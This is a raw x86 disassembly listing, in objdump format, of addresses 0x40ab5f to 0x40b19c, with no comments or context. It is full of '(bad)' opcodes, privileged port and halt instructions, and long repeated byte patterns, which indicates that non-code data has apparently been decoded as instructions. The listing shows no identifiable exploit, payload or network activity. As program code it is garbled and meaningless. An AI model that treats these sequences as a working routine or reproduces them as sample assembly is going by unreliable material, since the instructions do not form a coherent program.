  40ab5f:	adc    DWORD PTR [eax+ebx*1],edx
  40ab62:	sbb    al,0x24
  40ab64:	sub    BYTE PTR [esi],ch
  40ab66:	xor    al,0x36
  40ab68:	cmp    DWORD PTR ds:0xdf4d4645,edi
  40ab6e:	(bad)  
  40ab70:	jno    0x40ab9c
  40ab72:	aaa    
  40ab73:	cld    
  40ab74:	add    DWORD PTR [ecx],eax
  40ab76:	add    DWORD PTR [ecx],eax
  40ab78:	add    DWORD PTR [ecx],eax
  40ab7a:	add    ebp,esi
  40ab7c:	in     eax,dx
  40ab7d:	in     eax,dx
  40ab7e:	hlt    
  40ab7f:	icebp  
  40ab80:	mov    al,0x99
  40ab82:	cdq    
  40ab83:	cdq    
  40ab84:	rcl    al,1
  40ab86:	rcl    al,1
  40ab88:	ror    ebp,cl
  40ab8a:	retf   0x81c7
  40ab8d:	pop    esp
  40ab8e:	adc    eax,0x18141112
  40ab93:	sbb    al,0x24
  40ab95:	sub    BYTE PTR [esi],ch
  40ab97:	xor    al,0x36
  40ab99:	cmp    DWORD PTR ds:0xdfdf5445,edi
  40ab9f:	(bad)  
  40aba1:	push   eax
  40aba2:	and    DWORD PTR [ecx+0x57],eax
  40aba5:	add    DWORD PTR [ecx],eax
  40aba7:	add    DWORD PTR [ecx],eax
  40aba9:	add    DWORD PTR [ecx],eax
  40abab:	cmc    
  40abac:	out    dx,eax
  40abad:	div    bl
  40abaf:	pop    edx
  40abb0:	xchg   ecx,eax
  40abb1:	cdq    
  40abb2:	cdq    
  40abb3:	cdq    
  40abb4:	rcl    ecx,1
  40abb6:	rcl    ecx,1
  40abb8:	rcl    eax,1
  40abba:	rcl    al,1
  40abbc:	push   ds
  40abbd:	and    BYTE PTR [edx],bl
  40abbf:	adc    eax,0x18141112
  40abc4:	sbb    al,0x24
  40abc6:	sub    BYTE PTR [esi],ch
  40abc8:	xor    al,0x36
  40abca:	cmp    DWORD PTR [esi-0x21],eax
  40abcd:	(bad)  
  40abcf:	(bad)  
  40abd1:	fbstp  TBYTE PTR [edx+0x23]
  40abd4:	inc    BYTE PTR [ecx]
  40abd6:	add    DWORD PTR [ecx],eax
  40abd8:	add    DWORD PTR [ecx],eax
  40abda:	add    ebp,esi
  40abdc:	out    dx,al
  40abdd:	pop    edx
  40abde:	jmp    0x40aba8
  40abe0:	scas   eax,DWORD PTR es:[edi]
  40abe1:	cwde   
  40abe2:	cwde   
  40abe3:	cwde   
  40abe4:	rcl    dl,cl
  40abe6:	rcl    dl,cl
  40abe8:	rcl    eax,1
  40abea:	ror    cl,1
  40abec:	gs es pop ds
  40abef:	sbb    dl,BYTE PTR ds:0x18141112
  40abf5:	sbb    al,0x24
  40abf7:	sub    BYTE PTR [esi],ch
  40abf9:	xor    al,0x36
  40abfb:	dec    edx
  40abfc:	(bad)  
  40abfe:	(bad)  
  40ac00:	(bad)  
  40ac02:	fbstp  TBYTE PTR [eax]
  40ac04:	aaa    
  40ac05:	push   ebp
  40ac06:	add    DWORD PTR [ecx],eax
  40ac08:	add    DWORD PTR [ecx],eax
  40ac0a:	add    ebp,esi
  40ac0c:	jmp    0x9898:0xafebeaea
  40ac13:	cwde   
  40ac14:	rcl    ebx,cl
  40ac16:	rcl    ebx,cl
  40ac18:	rcl    eax,1
  40ac1a:	shl    BYTE PTR [esi+0x6d],1
  40ac1d:	sub    al,0x26
  40ac1f:	pop    ds
  40ac20:	sbb    dl,BYTE PTR ds:0x18141112
  40ac26:	sbb    al,0xc
  40ac28:	or     DWORD PTR [esi],ebp
  40ac2a:	xor    eax,0xdfdfdfdf
  40ac2f:	(bad)  
  40ac31:	(bad)  
  40ac33:	dec    ebx
  40ac34:	and    edi,esi
  40ac36:	add    DWORD PTR [ecx],eax
  40ac38:	add    DWORD PTR [ecx],eax
  40ac3a:	add    esp,esi
  40ac3c:	jmp    0xb02b972b
  40ac41:	cwde   
  40ac42:	cwde   
  40ac43:	cwde   
  40ac44:	aam    0xd4
  40ac46:	aam    0xd4
  40ac48:	rcl    al,cl
  40ac4a:	iret   
  40ac4b:	and    eax,0x262c3335
  40ac50:	pop    ds
  40ac51:	sbb    dl,BYTE PTR ds:0x6091112
  40ac57:	push   es
  40ac58:	push   es
  40ac59:	add    eax,0xdfdf040d
  40ac5e:	(bad)  
  40ac60:	(bad)  
  40ac62:	(bad)  
  40ac64:	xor    BYTE PTR [ecx-0x9],al
  40ac67:	add    DWORD PTR [ecx],eax
  40ac69:	add    DWORD PTR [ecx],eax
  40ac6b:	hlt    
  40ac6c:	call   0xb02b975a
  40ac71:	mov    eax,ds:0xd5d5a1a1
  40ac76:	aad    0xd5
  40ac78:	rcl    al,cl
  40ac7a:	int3   
  40ac7b:	das    
  40ac7c:	cmp    DWORD PTR ds:0x1f262c33,esi
  40ac82:	sbb    dl,BYTE PTR ds:0x605050b
  40ac88:	push   es
  40ac89:	add    eax,0xdf040205
  40ac8e:	(bad)  
  40ac90:	(bad)  
  40ac92:	(bad)  
  40ac94:	ds daa 
  40ac96:	push   ebp
  40ac97:	add    DWORD PTR [ecx],eax
  40ac99:	add    DWORD PTR [ecx],eax
  40ac9b:	hlt    
  40ac9c:	out    0xe8,eax
  40ac9e:	jmp    0xa1e25c8d
  40aca3:	mov    eax,ds:0xd5d5d5d5
  40aca8:	rcl    eax,cl
  40acaa:	leave  
  40acab:	pop    ebp
  40acac:	cmp    bh,BYTE PTR [ecx]
  40acae:	xor    eax,0x1f262c33
  40acb3:	xor    eax,DWORD PTR [edx]
  40acb5:	add    eax,0x1019190a
  40acba:	add    al,BYTE PTR [edx]
  40acbc:	add    ebx,edi
  40acbe:	add    al,0x58
  40acc0:	pop    ecx
  40acc1:	pop    ecx
  40acc2:	pop    ecx
  40acc3:	pop    ecx
  40acc4:	dec    edi
  40acc5:	and    edi,esi
  40acc7:	add    DWORD PTR [ecx],eax
  40acc9:	add    DWORD PTR [ecx],eax
  40accb:	hlt    
  40accc:	out    0xe7,eax
  40acce:	call   0xa0e15cbc
  40acd3:	mov    al,ds:0xd6d6d6d6
  40acd8:	rcl    eax,cl
  40acda:	leave  
  40acdb:	imul   edi,DWORD PTR ds:0x3335393a,0x248262c
  40ace5:	or     DWORD PTR [edx+ebp*1+0x67],esp
  40ace9:	push   ds
  40acea:	dec    ebx
  40aceb:	add    al,BYTE PTR [ebx]
  40aced:	pop    ecx
  40acee:	jae    0x40ad63
  40acf0:	jae    0x40ad65
  40acf2:	jae    0x40ad67
  40acf4:	jae    0x40ad14
  40acf6:	(bad)  
  40acf7:	test   DWORD PTR [ecx],0xe6f40101
  40acfd:	out    0xe7,eax
  40acff:	call   0xa0e14db3
  40ad04:	(bad)  
  40ad05:	(bad)  
  40ad06:	(bad)  
  40ad07:	(bad)  
  40ad08:	aam    0xd0
  40ad0a:	leave  
  40ad0b:	imul   edi,DWORD PTR ds:0x35393a3b,0x24d2c33
  40ad15:	sbb    eax,0x84a0d80f
  40ad1a:	sub    dh,BYTE PTR [ebx+0x3]
  40ad1d:	pushf  
  40ad1e:	jno    0x40ad91
  40ad20:	jno    0x40ad93
  40ad22:	jno    0x40ad95
  40ad24:	jno    0x40ad4f
  40ad26:	inc    ecx
  40ad27:	test   DWORD PTR [ecx],0xe5f40101
  40ad2d:	out    0xe7,al
  40ad2f:	out    0x91,eax
  40ad31:	xchg   esi,eax
  40ad32:	xchg   esi,eax
  40ad33:	xchg   esi,eax
  40ad34:	xlat   BYTE PTR ds:[ebx]
  40ad35:	xlat   BYTE PTR ds:[ebx]
  40ad36:	xlat   BYTE PTR ds:[ebx]
  40ad37:	xlat   BYTE PTR ds:[ebx]
  40ad38:	aad    0xda
  40ad3a:	add    BYTE PTR [ebp+0x3a],ch
  40ad3d:	cmp    bh,BYTE PTR [edx]
  40ad3f:	cmp    bh,BYTE PTR [edx]
  40ad41:	cmp    bh,BYTE PTR [edx]
  40ad43:	push   edx
  40ad44:	add    ch,BYTE PTR [ebp+0x7]
  40ad47:	fcom   DWORD PTR [esi+0x36b1e96]
  40ad4d:	jae    0x40adc5
  40ad4f:	jbe    0x40adc7
  40ad51:	jbe    0x40adc9
  40ad53:	jbe    0x40adcb
  40ad55:	addr16 inc ecx
  40ad57:	test   DWORD PTR [ecx],0xe5f40101
  40ad5d:	in     eax,0xe6
  40ad5f:	out    0x91,eax
  40ad61:	xchg   esi,eax
  40ad62:	xchg   esi,eax
  40ad63:	xchg   esi,eax
  40ad64:	xlat   BYTE PTR ds:[ebx]
  40ad65:	xlat   BYTE PTR ds:[ebx]
  40ad66:	xlat   BYTE PTR ds:[ebx]
  40ad67:	xlat   BYTE PTR ds:[ebx]
  40ad68:	(bad)  
  40ad6a:	add    BYTE PTR [ebp+0x3a],bl
  40ad6d:	cmp    bh,BYTE PTR [edx]
  40ad6f:	cmp    bh,BYTE PTR [edx]
  40ad71:	cmp    bh,BYTE PTR [edx]
  40ad73:	dec    ebp
  40ad74:	add    cl,BYTE PTR [ebx]
  40ad76:	sub    bl,al
  40ad78:	xchg   esi,eax
  40ad79:	mov    bl,BYTE PTR [esi]
  40ad7b:	push   cs
  40ad7c:	add    eax,DWORD PTR [edx+0x24]
  40ad7f:	xor    DWORD PTR [edi+0x60],ebx
  40ad82:	popa   
  40ad83:	push   0x62
  40ad85:	addr16 inc ecx
  40ad87:	test   DWORD PTR [ecx],0xe5f40101
  40ad8d:	in     eax,0xe5
  40ad8f:	out    0x91,al
  40ad91:	xchg   esi,eax
  40ad92:	xchg   esi,eax
  40ad93:	xchg   esi,eax
  40ad94:	xlat   BYTE PTR ds:[ebx]
  40ad95:	(bad)  
  40ad97:	fcmovnu st,st(3)
  40ad99:	fstp   st(6)
  40ad9b:	pop    esi
  40ad9c:	cmp    bh,BYTE PTR [edx]
  40ad9e:	cmp    bh,BYTE PTR [edx]
  40ada0:	cmp    bh,BYTE PTR [edx]
  40ada2:	cmp    ecx,DWORD PTR [ebp+0x2]
  40ada5:	add    cl,BYTE PTR [ebx+0x5b]
  40ada8:	fs pop ebx
  40adaa:	pop    ss
  40adab:	or     eax,DWORD PTR [ebx]
  40adad:	ss sbb al,0x24
  40adb0:	sub    BYTE PTR [esi],ch
  40adb2:	xor    al,0x36
  40adb4:	cmp    DWORD PTR [ebx],ebp
  40adb6:	inc    ecx
  40adb7:	test   DWORD PTR [ecx],0xe4f30101
  40adbd:	in     eax,0xe5
  40adbf:	in     eax,0x91
  40adc1:	xchg   ebp,eax
  40adc2:	xchg   ebp,eax
  40adc3:	xchg   ebp,eax
  40adc4:	fstp   st(3)
  40adc6:	fcmovnu st,st(3)
  40adc8:	fcmovnu st,st(5)
  40adca:	fisubr WORD PTR [ecx]
  40adcc:	cmp    bh,BYTE PTR [edx]
  40adce:	cmp    bh,BYTE PTR [edx]
  40add0:	inc    ebp
  40add1:	dec    ebp
  40add2:	push   esp
  40add3:	fild   WORD PTR [edx]
  40add5:	add    eax,0x1d2f3c02
  40adda:	or     DWORD PTR [edx],eax
  40addc:	push   edx
  40addd:	sbb    BYTE PTR [eax],bl
  40addf:	sbb    al,0x24
  40ade1:	sub    BYTE PTR [esi],ch
  40ade3:	xor    al,0x36
  40ade5:	and    eax,0x1010141
  40adea:	add    ebx,esi
  40adec:	jecxz  0x40add2
  40adee:	in     eax,0xe5
  40adf0:	xchg   ecx,eax
  40adf1:	xchg   ebp,eax
  40adf2:	xchg   ebp,eax
  40adf3:	xchg   ebp,eax
  40adf4:	fstp   st(5)
  40adf6:	fcmovnu st,st(3)
  40adf8:	fcmovnu st,st(5)
  40adfa:	ficomp WORD PTR [esi]
  40adfc:	pusha  
  40adfd:	cmp    eax,0xdfdf534a
  40ae02:	(bad)  
  40ae04:	add    al,0x2
  40ae06:	add    eax,0x5060606
  40ae0b:	add    dh,BYTE PTR [ebx]
  40ae0d:	adc    DWORD PTR [eax+ebx*1],edx
  40ae10:	sbb    al,0x24
  40ae12:	sub    BYTE PTR [esi],ch
  40ae14:	adc    BYTE PTR [esi],bl
  40ae16:	push   edi
  40ae17:	add    DWORD PTR [ecx],eax
  40ae19:	add    DWORD PTR [ecx],eax
  40ae1b:	repz jecxz 0x40add4
  40ae1e:	mov    edx,0x8d8d91c0
  40ae23:	(bad)  
  40ae24:	(bad)  
  40ae26:	fstp   st(3)
  40ae28:	fcmovnu st,st(5)
  40ae2a:	fld    QWORD PTR [eax]
  40ae2c:	inc    edi
  40ae2d:	(bad)  
  40ae2f:	(bad)  
  40ae31:	(bad)  
  40ae33:	(bad)  
  40ae35:	add    eax,DWORD PTR ds:0x5050606
  40ae3b:	or     DWORD PTR ds:0x18141112,edx
  40ae41:	sbb    al,0x24
  40ae43:	sub    BYTE PTR [ebp+0x23],bl
  40ae46:	pop    es
  40ae47:	add    DWORD PTR [ecx],eax
  40ae49:	add    DWORD PTR [ecx],eax
  40ae4b:	repz xchg ebp,eax
  40ae4d:	mov    eax,0x949ac0b8
  40ae52:	xchg   esp,eax
  40ae53:	xchg   esp,eax
  40ae54:	xchg   esp,eax
  40ae55:	xchg   esp,eax
  40ae56:	xchg   esp,eax
  40ae57:	mov    bh,0xf0
  40ae59:	(bad)  
  40ae5b:	fidiv  WORD PTR [eax]
  40ae5d:	(bad)  
  40ae5f:	(bad)  
  40ae61:	(bad)  
  40ae63:	(bad)  
  40ae65:	fild   WORD PTR [edx+0x8]
  40ae68:	or     BYTE PTR [ecx],cl
  40ae6a:	es pop ds
  40ae6c:	sbb    dl,BYTE PTR ds:0x18141112
  40ae72:	sbb    al,0x24
  40ae74:	gs daa 
  40ae76:	add    DWORD PTR [ecx],eax
  40ae78:	add    DWORD PTR [ecx],eax
  40ae7a:	add    edx,esi
  40ae7c:	mov    esp,0x9ab5b8b8
  40ae81:	xchg   ebx,eax
  40ae82:	xchg   ebx,eax
  40ae83:	xchg   ebx,eax
  40ae84:	xchg   ebx,eax
  40ae85:	xchg   ebx,eax
  40ae86:	xchg   ebx,eax
  40ae87:	xchg   ebx,eax
  40ae88:	xchg   ebx,eax
  40ae89:	xchg   ebx,eax
  40ae8a:	mov    DWORD PTR ds:0xdfdf4b63,edx
  40ae90:	(bad)  
  40ae92:	(bad)  
  40ae94:	fist   WORD PTR [edx+0x3a]
  40ae97:	cmp    DWORD PTR ds:0x1f262c33,esi
  40ae9d:	sbb    dl,BYTE PTR ds:0x18141112
  40aea3:	sbb    ebx,DWORD PTR [ebx+0x49]
  40aea6:	add    DWORD PTR [ecx],eax
  40aea8:	add    DWORD PTR [ecx],eax
  40aeaa:	add    edx,esi
  40aeac:	mov    ebx,0x9ab5a4b8
  40aeb1:	xchg   edx,eax
  40aeb2:	xchg   edx,eax
  40aeb3:	xchg   edx,eax
  40aeb4:	xchg   edx,eax
  40aeb5:	xchg   edx,eax
  40aeb6:	xchg   edx,eax
  40aeb7:	xchg   edx,eax
  40aeb8:	xchg   edx,eax
  40aeb9:	xchg   edx,eax
  40aeba:	xchg   edx,eax
  40aebb:	sbb    BYTE PTR [ecx],0x2a
  40aebe:	pop    ecx
  40aebf:	(bad)  
  40aec1:	(bad)  
  40aec3:	(bad)  
  40aec5:	or     eax,0x35393a3d
  40aeca:	xor    ebp,DWORD PTR [esi+eiz*1]
  40aecd:	pop    ds
  40aece:	sbb    dl,BYTE PTR ds:0x17141112
  40aed4:	daa    
  40aed5:	add    DWORD PTR [ecx],eax
  40aed7:	add    DWORD PTR [ecx],eax
  40aed9:	add    DWORD PTR [ecx],eax
  40aedb:	icebp  
  40aedc:	stos   DWORD PTR es:[edi],eax
  40aedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aedf:	mov    ch,0x9a
  40aee1:	lahf   
  40aee2:	lahf   
  40aee3:	lahf   
  40aee4:	lahf   
  40aee5:	lahf   
  40aee6:	lahf   
  40aee7:	lahf   
  40aee8:	lahf   
  40aee9:	lahf   
  40aeea:	lahf   
  40aeeb:	lahf   
  40aeec:	sbb    BYTE PTR [eax+edi*1-0x21],0xdf
  40aef1:	(bad)  
  40aef3:	fist   WORD PTR [esi+eax*2+0x42]
  40aef7:	cmp    eax,0x3335393a
  40aefc:	sub    al,0x26
  40aefe:	pop    ds
  40aeff:	sbb    dl,BYTE PTR ds:0x75b1312
  40af05:	add    DWORD PTR [ecx],eax
  40af07:	add    DWORD PTR [ecx],eax
  40af09:	add    DWORD PTR [ecx],eax
  40af0b:	icebp  
  40af0c:	stos   DWORD PTR es:[edi],eax
  40af0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af0f:	xchg   edi,eax
  40af10:	scas   al,BYTE PTR es:[edi]
  40af11:	stos   BYTE PTR es:[edi],al
  40af12:	stos   BYTE PTR es:[edi],al
  40af13:	stos   BYTE PTR es:[edi],al
  40af14:	stos   BYTE PTR es:[edi],al
  40af15:	stos   BYTE PTR es:[edi],al
  40af16:	stos   BYTE PTR es:[edi],al
  40af17:	stos   BYTE PTR es:[edi],al
  40af18:	stos   BYTE PTR es:[edi],al
  40af19:	stos   BYTE PTR es:[edi],al
  40af1a:	stos   BYTE PTR es:[edi],al
  40af1b:	stos   BYTE PTR es:[edi],al
  40af1c:	stos   BYTE PTR es:[edi],al
  40af1d:	mov    BYTE PTR [ebx+0x3f],ah
  40af20:	(bad)  
  40af22:	(bad)  
  40af24:	push   edx
  40af25:	dec    eax
  40af26:	inc    ebp
  40af27:	inc    edx
  40af28:	cmp    eax,0x3335393a
  40af2d:	sub    al,0x26
  40af2f:	pop    ds
  40af30:	sbb    dl,BYTE PTR [esi]
  40af32:	pop    esp
  40af33:	add    WORD PTR [ecx],ax
  40af36:	add    DWORD PTR [ecx],eax
  40af38:	add    DWORD PTR [ecx],eax
  40af3a:	add    ecx,esi
  40af3c:	stos   DWORD PTR es:[edi],eax
  40af3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af3e:	lods   eax,DWORD PTR ds:[esi]
  40af3f:	loop   0x40aeef
  40af41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af4e:	test   al,0x6f
  40af50:	aas    
  40af51:	(bad)  
  40af53:	fisttp WORD PTR [ebp+0xd]
  40af56:	dec    eax
  40af57:	inc    ebp
  40af58:	inc    edx
  40af59:	cmp    eax,0x3335393a
  40af5e:	sub    al,0x26
  40af60:	and    bl,BYTE PTR [esi+eiz*2+0x1]
  40af64:	add    DWORD PTR [ecx],eax
  40af66:	add    DWORD PTR [ecx],eax
  40af68:	add    DWORD PTR [ecx],eax
  40af6a:	add    eax,esi
  40af6c:	mov    dh,0xb0
  40af6e:	out    dx,al
  40af6f:	in     al,dx
  40af70:	scas   al,BYTE PTR es:[edi]
  40af71:	mov    bl,0xb3
  40af73:	mov    bl,0xb3
  40af75:	mov    bl,0xb3
  40af77:	mov    bl,0xb3
  40af79:	mov    bl,0xb3
  40af7b:	mov    bl,0xb3
  40af7d:	mov    bl,0xb3
  40af7f:	test   al,0x78
  40af81:	addr16 jae 0x40afd8
  40af84:	dec    ebp
  40af85:	dec    edx
  40af86:	or     eax,0x3d424548
  40af8b:	cmp    bh,BYTE PTR [ecx]
  40af8d:	xor    eax,0x325c2d33
  40af92:	add    DWORD PTR [ecx],eax
  40af94:	add    DWORD PTR [ecx],eax
  40af96:	add    DWORD PTR [ecx],eax
  40af98:	add    DWORD PTR [ecx],eax
  40af9a:	add    eax,esi
  40af9c:	pop    edx
  40af9d:	cmc    
  40af9e:	hlt    
  40af9f:	in     eax,0xae
  40afa1:	mov    dl,0xb2
  40afa3:	mov    eax,0xbabab9b9
  40afa8:	mov    cl,0xb2
  40afaa:	mov    dl,0xb2
  40afac:	mov    dl,0xb2
  40afae:	mov    dl,0xb2
  40afb0:	mov    dl,0x80
  40afb2:	push   ds
  40afb3:	outs   dx,BYTE PTR ds:[esi]
  40afb4:	dec    esi
  40afb5:	dec    ebp
  40afb6:	dec    edx
  40afb7:	or     eax,0x3d424548
  40afbc:	cmp    ah,BYTE PTR [eax+0x5e]
  40afbf:	pop    ebx
  40afc0:	inc    eax
  40afc1:	add    DWORD PTR [ecx],eax
  40afc3:	add    DWORD PTR [ecx],eax
  40afc5:	add    DWORD PTR [ecx],eax
  40afc7:	add    DWORD PTR [ecx],eax
  40afc9:	add    DWORD PTR [ecx],eax
  40afcb:	out    dx,eax
  40afcc:	jmp    0x40afb9
  40afce:	out    dx,al
  40afcf:	out    dx,al
  40afd0:	scas   al,BYTE PTR es:[edi]
  40afd1:	mov    cl,0xb9
  40afd3:	mov    ah,0xc5
  40afd5:	sar    DWORD PTR [esi-0x47464544],0xb9
  40afdc:	mov    edx,0xb1b1baba
  40afe1:	mov    cl,0x9e
  40afe3:	jl     0x40b003
  40afe5:	cmp    BYTE PTR [esi+0x44],ch
  40afe8:	inc    esp
  40afe9:	bound  ebp,QWORD PTR [ecx+0x68]
  40afec:	das    
  40afed:	pop    ebx
  40afee:	add    DWORD PTR [bx+di],eax
  40aff1:	add    DWORD PTR [ecx],eax
  40aff3:	add    DWORD PTR [ecx],eax
  40aff5:	add    DWORD PTR [ecx],eax
  40aff7:	add    DWORD PTR [ecx],eax
  40aff9:	add    DWORD PTR [ecx],eax
  40affb:	out    dx,eax
  40affc:	in     al,dx
  40affd:	cmc    
  40affe:	hlt    
  40afff:	out    0xae,al
  40b001:	mov    edx,0xe15959bd
  40b006:	loope  0x40afea
  40b008:	loop   0x40afed
  40b00a:	jecxz  0x40afcc
  40b00c:	mov    edi,0xb8bab1bb
  40b011:	mov    ecx,0x9ebabab9
  40b016:	cmp    BYTE PTR [eax+0x21],0x21
  40b01a:	data16 add WORD PTR [ecx],ax
  40b01e:	add    DWORD PTR [ecx],eax
  40b020:	add    DWORD PTR [ecx],eax
  40b022:	add    DWORD PTR [ecx],eax
  40b024:	add    DWORD PTR [ecx],eax
  40b026:	add    DWORD PTR [ecx],eax
  40b028:	add    DWORD PTR [ecx],eax
  40b02a:	add    edi,ebp
  40b02c:	jmp    0xe0b3:0xa159e0e7
  40b033:	loopne 0x40b08e
  40b035:	pop    ecx
  40b036:	loope  0x40b019
  40b038:	loop   0x40b01c
  40b03a:	jecxz  0x40b01f
  40b03c:	in     al,0xe5
  40b03e:	out    0xe7,al
  40b040:	call   0xb2046ffa
  40b045:	mov    edx,0xb9b9b9b8
  40b04a:	clc    
  40b04b:	cld    
  40b04c:	cli    
  40b04d:	cli    
  40b04e:	add    DWORD PTR [ecx],eax
  40b050:	add    DWORD PTR [ecx],eax
  40b052:	add    DWORD PTR [ecx],eax
  40b054:	add    DWORD PTR [ecx],eax
  40b056:	add    DWORD PTR [ecx],eax
  40b058:	add    DWORD PTR [ecx],eax
  40b05a:	add    esi,ebp
  40b05c:	pop    eax
  40b05d:	loopne 0x40b03f
  40b05f:	loopne 0x40b017
  40b061:	les    ebx,FWORD PTR [eax-0x20]
  40b064:	loopne 0x40b0bf
  40b066:	pop    ecx
  40b067:	loope  0x40b04a
  40b069:	loop   0x40b04d
  40b06b:	jecxz  0x40b050
  40b06d:	in     al,0xe5
  40b06f:	out    0xe7,al
  40b071:	call   0xec2b9a5f
  40b076:	in     al,dx
  40b077:	mov    bh,0xad
  40b079:	ret    
  40b07a:	cmc    
  40b07b:	pop    es
  40b07c:	cli    
  40b07d:	push   edi
  40b07e:	push   ebp
  40b07f:	clc    
  40b080:	add    DWORD PTR [ecx],eax
  40b082:	add    DWORD PTR [ecx],eax
  40b084:	add    DWORD PTR [ecx],eax
  40b086:	add    DWORD PTR [ecx],eax
  40b088:	add    DWORD PTR [ecx],eax
  40b08a:	add    esi,ebp
  40b08c:	pop    eax
  40b08d:	pop    eax
  40b08e:	jecxz  0x40b07c
  40b090:	aas    
  40b091:	pop    ebx
  40b092:	cmp    BYTE PTR [edi],bh
  40b094:	inc    edi
  40b095:	dec    edi
  40b096:	push   ecx
  40b097:	pop    ecx
  40b098:	loope  0x40b07b
  40b09a:	loop   0x40b07e
  40b09c:	jecxz  0x40b081
  40b09e:	in     al,0xe5
  40b0a0:	out    0xe7,al
  40b0a2:	call   0xec2b9a90
  40b0a7:	in     al,dx
  40b0a8:	in     al,dx
  40b0a9:	in     al,dx
  40b0aa:	pop    edx
  40b0ab:	pop    edx
  40b0ac:	in     eax,dx
  40b0ad:	hlt    
  40b0ae:	test   BYTE PTR [ecx],0x1
  40b0b1:	add    DWORD PTR [ecx],eax
  40b0b3:	add    DWORD PTR [ecx],eax
  40b0b5:	add    DWORD PTR [ecx],eax
  40b0b7:	add    DWORD PTR [ecx],eax
  40b0b9:	add    DWORD PTR [ecx],eax
  40b0bb:	out    dx,al
  40b0bc:	loope  0x40b0a8
  40b0be:	in     al,dx
  40b0bf:	in     al,dx
  40b0c0:	xor    BYTE PTR [ebx+0x25],ah
  40b0c3:	and    eax,0x29295c5c
  40b0c8:	cmp    BYTE PTR [edi],bh
  40b0ca:	inc    edi
  40b0cb:	ins    BYTE PTR es:[edi],dx
  40b0cc:	push   ecx
  40b0cd:	push   esi
  40b0ce:	jecxz  0x40b0b4
  40b0d0:	in     eax,0xe6
  40b0d2:	out    0xe8,eax
  40b0d4:	jmp    0xed2c9bc2
  40b0d9:	in     al,dx
  40b0da:	in     al,dx
  40b0db:	pop    edx
  40b0dc:	hlt    
  40b0dd:	hlt    
  40b0de:	add    DWORD PTR [ecx],eax
  40b0e0:	add    DWORD PTR [ecx],eax
  40b0e2:	add    DWORD PTR [ecx],eax
  40b0e4:	add    DWORD PTR [ecx],eax
  40b0e6:	add    DWORD PTR [ecx],eax
  40b0e8:	add    DWORD PTR [ecx],eax
  40b0ea:	add    esi,ebp
  40b0ec:	jmp    0x2525:0x636ceaea
  40b0f3:	pop    esp
  40b0f4:	pop    esp
  40b0f5:	sub    DWORD PTR [ecx],ebp
  40b0f7:	fs sub ebp,DWORD PTR fs:[ebx]
  40b0fb:	gs gs das 
  40b0fe:	das    
  40b0ff:	outs   dx,BYTE PTR ds:[esi]
  40b101:	ins    BYTE PTR es:[edi],dx
  40b102:	jmp    0xea2a99ee
  40b107:	jmp    0x1f6:0xf55aeceb
  40b10e:	add    DWORD PTR [ecx],eax
  40b110:	add    DWORD PTR [ecx],eax
  40b112:	add    DWORD PTR [ecx],eax
  40b114:	add    DWORD PTR [ecx],eax
  40b116:	add    DWORD PTR [ecx],eax
  40b118:	add    DWORD PTR [ecx],eax
  40b11a:	icebp  
  40b11b:	out    0xe7,eax
  40b11d:	out    0xe7,eax
  40b11f:	mov    BYTE PTR [ecx+0x29646581],al
  40b125:	sub    DWORD PTR [esp+eiz*2+0x2b],esp
  40b129:	sub    esp,DWORD PTR [ebp+0x65]
  40b12c:	das    
  40b12d:	das    
  40b12e:	das    
  40b12f:	pop    esi
  40b130:	pop    esi
  40b131:	pop    esi
  40b132:	dec    edi
  40b133:	in     al,0xe1
  40b135:	pop    ecx
  40b136:	pop    ecx
  40b137:	loope  0x40b11b
  40b139:	jg     0x40b131
  40b13b:	std    
  40b13c:	add    DWORD PTR [ecx],eax
  40b13e:	add    DWORD PTR [ecx],eax
  40b140:	add    DWORD PTR [ecx],eax
  40b142:	add    DWORD PTR [ecx],eax
  40b144:	add    DWORD PTR [ecx],eax
  40b146:	add    DWORD PTR [ecx],eax
  40b148:	add    DWORD PTR [ecx],eax
  40b14a:	repnz in al,0xe4
  40b14d:	in     al,0xb0
  40b14f:	mov    bl,0xa5
  40b151:	test   eax,0x8c93929f
  40b156:	mov    BYTE PTR [ebx+0x7b],bh
  40b159:	pop    ebp
  40b15a:	pop    esi
  40b15b:	das    
  40b15c:	das    
  40b15d:	das    
  40b15e:	pop    esi
  40b15f:	pop    esi
  40b160:	pop    esi
  40b161:	pop    esi
  40b162:	push   ecx
  40b163:	loope  0x40b145
  40b165:	fist   WORD PTR [ebx+0x4d]
  40b168:	dec    edx
  40b169:	dec    edx
  40b16a:	hlt    
  40b16b:	std    
  40b16c:	add    DWORD PTR [ecx],eax
  40b16e:	add    DWORD PTR [ecx],eax
  40b170:	add    DWORD PTR [ecx],eax
  40b172:	add    DWORD PTR [ecx],eax
  40b174:	add    DWORD PTR [ecx],eax
  40b176:	add    DWORD PTR [ecx],eax
  40b178:	add    eax,esi
  40b17a:	out    0xe2,al
  40b17c:	loop   0x40b160
  40b17e:	shl    DWORD PTR [ebp-0x6c6d6057],0x94
  40b185:	xchg   esp,eax
  40b186:	lea    ecx,[ebp-0x7c7c7c73]
  40b18c:	jge    0x40b208
  40b18e:	ja     0x40b1fd
  40b190:	ins    DWORD PTR es:[edi],dx
  40b191:	push   0x46484c76
  40b196:	inc    esi
  40b197:	dec    eax
  40b198:	dec    edx
  40b199:	dec    ebp
  40b19a:	pop    edx
  40b19b:	sti    
  40b19c:	push   ebp
